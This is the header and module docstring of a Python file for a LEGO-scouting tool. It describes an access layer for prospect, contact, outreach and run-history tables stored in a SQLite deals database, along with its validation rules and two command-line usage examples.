#!/usr/bin/env python3
"""Access layer for the prospector tables inside the deal ledger database.

`ledger_db.py` owns the deals DOCUMENT -- load the whole thing, save the whole
thing. The prospect tables are the opposite shape: a run appends one company, one
phone number, one outreach step at a time, and each of those is a targeted write
inside its own transaction. So they live in the same `found_deals.db` file behind
this separate module rather than inside the document layer. `ledger_db.save()`
deletes only `deals` and `source_watermarks`, so a full-document save leaves every
table here intact.

Four tables:
  prospects      a company/venue/event that might yield used LEGO inventory
  contacts       how to reach one prospect -- phone, email, form URL, address
  outreach       one approval-gated conversation with one contact
  prospect_runs  what a run explored, INCLUDING explorations that found nothing

Validation raises here, in the access layer, rather than in a separate validator
script. Every raise names the offending value and the fix, and no write silently
substitutes a default: a prospect with no citation URL, no contact channel, or an
unregistered hypothesis type is an unfinished capture, not a lead.

    legoscout prospects        # counts by status/state, plus the run count
    legoscout prospects 7      # one prospect with its contacts and outreach
"""

